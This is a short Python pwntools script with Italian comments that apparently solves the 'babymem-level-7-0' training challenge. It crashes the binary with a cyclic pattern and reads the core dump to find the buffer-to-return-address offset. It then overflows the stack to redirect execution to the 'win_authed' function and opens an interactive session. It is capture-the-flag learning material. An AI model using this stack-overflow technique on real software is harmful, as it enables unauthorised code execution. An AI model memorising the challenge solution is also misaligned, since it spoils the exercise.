#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --


-----------------------------
'''

# Impostazione del livello di log
context.log_level = 'CRITICAL'

# File binario da eseguire
elf = ELF('/challenge/babymem-level-7-0')

# =========================================================== #
# =========================================================== #
# =========================================================== #

# Avvio del processo con 'setuid = false' per generare il memory core dump 
p_dump = elf.process(setuid=False)

# Invio di una cyclic string per far crashare il processo e ottenere il memory core dump 
p_dump.sendline(b'512')
p_dump.sendline(cyclic(512, n=8)) # n = 8 (byte) per la dimensione degli indirizzi
p_dump.wait()

# Uso del memory core dump generato per calcolare la dimensione del buffer
core_dump = p_dump.corefile.fault_addr
delta_len = cyclic_find(core_dump, n=8)
print(f'\nDistanza tra buffer e return address: {delta_len}\n')

# =========================================================== #
# =========================================================== #
# =========================================================== #

# Avvio del processo con 'setuid = true'
p = elf.process()

# Preparazione del bytestream
bytestream = b'A' * delta_len + p64(elf.symbols['win_authed'])

# Interazione con il processo e invio del bytestream
p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
